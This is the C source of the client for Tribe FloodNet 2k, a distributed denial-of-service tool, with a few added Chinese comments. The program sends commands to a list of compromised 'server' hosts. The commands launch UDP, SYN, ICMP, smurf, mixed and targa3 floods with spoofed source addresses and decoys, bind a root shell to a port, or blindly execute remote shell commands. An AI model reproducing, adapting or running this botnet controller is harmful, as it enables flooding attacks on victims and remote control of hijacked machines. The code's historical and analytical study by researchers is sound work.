/*
 * Tribe FloodNet - 2k edition
 * by Mixter <mixter@newyorkoffice.com>
 *
 * tfn.c - tribe floodnet client
 *
 * This program is distributed for educational purposes and without any
 * explicit or implicit warranty; in no event shall the author or
 * contributors be liable for any direct, indirect or incidental damages
 * arising in any way out of the use of this software.
 *
 */

#include "tribe.h"
#include <string.h>
#define RETRY 1		/* send datagrams x times, 20 is fine */

void usage (char *);
void tfn_sendto (unsigned int dst);
extern void security_through_obscurity (int);

#ifdef REQUIRE_PASS
void passchk (void);
#endif

#ifdef WINDOZE
extern char *optarg;
int getopt (int, char *const *, const char *);
#endif

char *target = NULL, *port = NULL,*passwd = NULL,RID = '0';
int nospoof = 0, cid = 0, decoy = 0, proto = -1;
unsigned int myip = 0;

int
main (int argc, char **argv)
{
  FILE *tfnlist = NULL;
  char nexthost[BS];
  unsigned int tfnhost = 0;
  int opt;

  if (argc < 2)
    usage (argv[0]);

  while ((opt = getopt (argc, argv, "P:D:S:f:h:i:p:c:M:")) != EOF)
    switch (opt)
      {
      case 'P':
	if (strcasecmp (optarg, "icmp") == 0)
	  proto = 0;
	if (strcasecmp (optarg, "udp") == 0)
	  proto = 1;
	if (strcasecmp (optarg, "tcp") == 0)
	  proto = 2;
	break;
      case 'D':
	decoy = atoi (optarg);
	break;
      case 'S':
	myip = resolve (optarg);
	break;
      case 'f':
	if ((tfnlist = fopen (optarg, "r")) == NULL)
	  {
	    printf ("Unable to open file: %s\n", optarg);
	    usage (argv[0]);
	  }
	break;
      case 'h':
	tfnhost = resolve (optarg);
	break;
      case 'M':
	passwd = malloc(BS);
	strncpy(passwd,optarg,BS);
	break;
      case 'i':
	target = malloc (BS);
	strncpy (target, optarg, BS);
	break;
      case 'p':
	port = malloc (BS);
	strncpy (port, optarg, BS);
	break;
      case 'c':
	cid = atoi (optarg);
	break;
      default:
	usage (argv[0]);
	break;
      }

  printf ("[0;35m\n");

  printf ("\tProtocol      : ");
  switch (proto)
    {
    case 0:
      printf ("icmp\n");
      break;
    case 1:
      printf ("udp\n");
      break;
    case 2:
      printf ("tcp\n");
      break;
    default:
      printf ("random\n");
      break;
    }

  if (decoy)
    printf ("\tDecoy hosts   : %d\n", decoy);

  if (myip)
    printf ("\tSource IP     : %s\n", ntoa (myip));
  else
    printf ("\tSource IP     : random\n");

  if (tfnlist != NULL)
    printf ("\tClient input  : list\n");
  else if (tfnhost != 0)
    printf ("\tClient input  : single host\n");
  else
    usage (argv[0]);

  if (port != NULL)
    printf ("\tTCP port      : %d\n", atoi (port));
  else if (cid == 5)
    {
      port = malloc (BS);
      strcpy (port, "0");
    }

  if (target != NULL)
    {
      if ((cid > 4) && (cid != 10))
	printf ("\tTarget(s)     : %s\n", target);
    }
  else if (cid)
    usage (argv[0]);

  printf ("\tCommand       : ");
  switch (cid)
    {
    case 0:
      RID = ID_STOPIT;
      printf ("stop flooding\n");
      if (target == NULL)
	{
	  target = malloc (BS);
	  strcpy (target, "0");
	}
      break;
    case 1:
      RID = ID_SWITCH;
      printf ("change spoof level to %d\n", atoi (target));
      break;
    case 2:
      RID = ID_PSIZE;
      printf ("change packet size to %d bytes\n", atoi (target));
      break;
    case 3:
      RID = ID_SHELL;
      printf ("bind shell(s) to port %d\n", atoi (target));
      break;
    case 4:
      RID = ID_SENDUDP;
      printf ("commence udp flood\n");
      break;
    case 5:
      RID = ID_SENDSYN;
      printf ("commence syn flood, port: %s\n",
	      atoi (port) ? port : "random");
      break;
    case 6:
      RID = ID_ICMP;
      printf ("commence icmp echo flood\n");
      break;
    case 7:
      RID = ID_SMURF;
      printf ("commence icmp broadcast (smurf) flood\n");
      break;
    case 8:
      RID = ID_MIX;
      printf ("commence mix flood\n");
      break;
    case 9:
      RID = ID_TARGA;
      printf ("commence targa3 attack\n");
      break;
    case 10:
      RID = ID_REXEC;
      printf ("execute remote command\n");
      break;
    default:
      printf ("error\n");
      usage (argv[0]);
      break;
    }

#ifdef REQUIRE_PASS
  passchk ();
#endif

  printf ("[0;31m\nSending out packets: [0;0m");
  fflush (stdout);

  security_through_obscurity (1);

  if (tfnlist == NULL)
    tfn_sendto (tfnhost);
  else
    while (fgets (nexthost, 512, tfnlist) != NULL) //tfnlist 为傀儡的ip地址的列表
      {
	switch (nexthost[0])
	  {
	  case '\n':
	  case '\r':
	  case ' ':
	  case '#':
	    continue;
	    break;
	  }
	trimbuf (nexthost);
	tfnhost = resolve (nexthost);
	if (tfnhost)
	  tfn_sendto (tfnhost);
      }

  printf ("\n");
  exit(0);
}

#ifdef REQUIRE_PASS
void
passchk (void)
{
  unsigned char test1[100] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", test2[100] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    enc1[100], enc2[100];
    char *p = malloc(100);;
    if(passwd == NULL)
        p = getpass ("\n[0;0mPassword verification:");

  memset (enc1, 0, 100);
  memset (enc2, 0, 100);

  security_through_obscurity (1);
  encode64 (test1, enc1, strlen ((char *)test1));
  security_through_obscurity (0);
  if(passwd == NULL)
     aes_setkey (p);
  else
     aes_setkey (passwd);
  encode64 (test2, enc2, strlen ((char *)test2));

  if (strcmp ((char *)enc1, (char *)enc2))
    {
//      fprintf (stderr, "Sorry, passwords do not match.\n");
//      fprintf (stderr, "1 %s\n2 %s\n", enc1, enc2);
      printf ("Sorry, passwords do not match.\n");
      printf ("1 %s\n2 %s\n", enc1, enc2);
      exit (0);
    }
}
#endif

void
tfn_sendto (unsigned int dst)
{
  int i, j;
  char ltarget[BS], lport[BS];
  unsigned int src = myip ? myip : k00lip ();

  for (i = 0; i < RETRY; i++)
    {
      if (cid == 5)
	{
	  strcpy (lport, port);
	  tfntransmit (src, dst, proto, ID_SYNPORT, lport); //RID = 5 攻击模式为tcp/syn
	  usleep (666);
	}
      strcpy (ltarget, target);
      tfntransmit (src, dst, proto, RID, ltarget); //如果cid = 5;调用tfntransmit函数两次，lport、ltar
      if (decoy) //
	for (j = 0; j < decoy; j++)
	  {
	    usleep (10);
	    strcpy (ltarget, target);
	    tfntransmit (src, k00lip (), proto, RID, ltarget);
	  }
      usleep (100);
    }

  for (j = 0; j < decoy; j++)
    printf ("d");

  printf (".");
  fflush (stdout);
}

void
usage (char *arg)
{
  printf ("[1;34musage: %s <options>\n", arg);
  printf ("[-P protocol]\tProtocol for server communication. Can be ICMP, UDP or TCP.\n\t\tUses a random protocol as default\n");
  printf ("[-D n]       \tSend out n bogus requests for each real one to decoy targets\n");
  printf ("[-S host/ip]\tSpecify your source IP. Randomly spoofed by default, you need\n\t\tto use your real IP if you are behind spoof-filtering routers\n");
  printf ("[-f hostlist]\tFilename containing a list of hosts with TFN servers to contact\n");
  printf ("[-h hostname]\tTo contact only a single host running a TFN server\n");
  printf ("[-i target string]\tContains options/targets separated by '%s', see below\n", DELIMITER);
  printf ("[-p port]         \tA TCP destination port can be specified for SYN floods\n");
  printf ("<-c command ID>\t0 - Halt all current floods on server(s) immediately\n");
  printf ("\t\t1 - Change IP antispoof-level (evade rfc2267 filtering)\n\t\t    usage: -i 0 (fully spoofed) to -i 3 (/24 host bytes spoofed)\n");
  printf ("\t\t2 - Change Packet size, usage: -i <packet size in bytes>\n");
  printf ("\t\t3 - Bind root shell to a port, usage: -i <remote port>\n");
  printf ("\t\t4 - UDP flood, usage: -i victim%svictim2%svictim3%s...\n", DELIMITER, DELIMITER, DELIMITER);
  printf ("\t\t5 - TCP/SYN flood, usage: -i victim%s... [-p destination port]\n", DELIMITER);
  printf ("\t\t6 - ICMP/PING flood, usage: -i victim%s...\n", DELIMITER);
  printf ("\t\t7 - ICMP/SMURF flood, usage: -i victim%sbroadcast%sbroadcast2%s...\n", DELIMITER, DELIMITER, DELIMITER);
  printf ("\t\t8 - MIX flood (UDP/TCP/ICMP interchanged), usage: -i victim%s...\n", DELIMITER);
  printf ("\t\t9 - TARGA3 flood (IP stack penetration), usage: -i victim%s...\n", DELIMITER);
  printf ("\t\t10 - Blindly execute remote shell command, usage -i command\n");
  printf ("[0;0m");
  exit (1);
}
